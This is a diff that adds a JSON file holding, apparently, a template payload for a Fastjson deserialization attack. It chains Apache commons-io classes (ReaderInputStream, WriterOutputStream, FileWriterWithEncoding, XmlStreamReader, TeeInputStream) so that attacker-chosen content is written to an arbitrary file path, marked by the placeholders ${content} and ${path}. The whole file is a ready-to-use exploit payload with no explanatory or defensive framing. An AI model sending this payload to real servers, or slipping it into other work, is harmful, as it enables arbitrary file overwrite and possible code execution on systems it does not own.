@@ -1,0 +1,79 @@
+{
+  "x":{
+    "@type":"com.alibaba.fastjson.JSONObject",
+    "input":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.ReaderInputStream",
+      "reader":{
+        "@type":"org.apache.commons.io.input.CharSequenceReader",
+        "charSequence":{"@type":"java.lang.String""${content}"
+      },
+      "charsetName":"UTF-8",
+      "bufferSize":1024
+    },
+    "branch":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.output.WriterOutputStream",
+      "writer":{
+        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
+        "file":"${path}",
+        "encoding":"UTF-8",
+        "append": false
+      },
+      "charsetName":"UTF-8",
+      "bufferSize": 1024,
+      "writeImmediately": true
+    },
+    "trigger":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "is":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+          "$ref":"$.input"
+        },
+        "branch":{
+          "$ref":"$.branch"
+        },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    },
+    "trigger2":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "is":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+          "$ref":"$.input"
+        },
+        "branch":{
+          "$ref":"$.branch"
+        },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    },
+    "trigger3":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "is":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+          "$ref":"$.input"
+        },
+        "branch":{
+          "$ref":"$.branch"
+        },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    }
+  }
+}
